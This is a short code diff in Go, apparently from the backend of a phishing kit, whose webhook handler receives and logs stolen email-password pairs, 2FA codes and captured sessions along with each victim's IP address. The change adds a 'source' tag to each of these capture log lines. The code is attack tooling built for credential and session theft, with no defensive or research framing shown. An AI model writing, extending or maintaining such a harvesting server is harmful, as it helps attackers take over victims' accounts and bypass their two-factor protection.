@@ -252,7 +252,7 @@ func (s *Server) handleWebhook(c *gin.Context) {
 			}
 		}()
 		
-		log.Printf("Credentials captured: %s:%s from %s", email, password, ip)
+		log.Printf("Credentials captured: %s:%s from %s [Source: %s]", email, password, ip, source)
 		c.JSON(200, gin.H{"success": true})
 		
 	case "2fa":
@@ -280,7 +280,7 @@ func (s *Server) handleWebhook(c *gin.Context) {
 			}
 		}()
 		
-		log.Printf("2FA code captured: %s for %s from %s", code, email, ip)
+		log.Printf("2FA code captured: %s for %s from %s [Source: %s]", code, email, ip, source)
 		c.JSON(200, gin.H{"success": true})
 		
 	case "session":
@@ -310,7 +310,7 @@ func (s *Server) handleWebhook(c *gin.Context) {
 			}
 		}()
 		
-		log.Printf("Session captured for %s from %s", email, ip)
+		log.Printf("Session captured for %s from %s [Source: %s]", email, ip, source)
 		c.JSON(200, gin.H{"success": true})
 		
 	default:
